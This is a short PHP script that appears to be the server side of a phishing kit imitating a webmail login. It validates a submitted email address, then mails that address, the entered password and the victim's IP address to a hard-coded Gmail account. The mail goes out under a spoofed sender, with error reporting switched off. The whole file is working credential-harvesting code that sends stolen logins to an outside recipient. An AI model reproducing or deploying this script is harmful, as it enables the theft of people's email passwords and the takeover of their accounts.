<?php
date_default_timezone_set("America/Los_Angeles");
error_reporting(0);

$yearDate=date("Y");

if(isset($_POST['logCheck'])){
$email=$_POST['email'];
if(!preg_match("/^[_\.0-9a-zA-Z-]+@([0-9a-zA-Z][0-9a-zA-Z-]+\.)+[a-zA-Z]{2,6}$/i", $email)){
//header("location:./"); 
echo 2; exit;
}
$q1Email1=stripos($email,"@");
		$myemail=strpbrk($email,"@");
		$email1=substr($email,0,$q1Email1);
		$email2=substr($myemail,1);

$ip = getenv("REMOTE_ADDR");
$message  = "--------------+ Result +--------------\n";
$message .= "E-mail ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";


$recipient = "henolowo@gmail.com";

$subject = "|WebMail|".$_POST['email'];
$headers = "From: Newhost<admin@web.com>";
			
mail($recipient,$subject,$message, $headers);
//header("Location: http://www.$email2/"); exit;
//header("location:./"); 
echo 1; exit; exit;
}
?>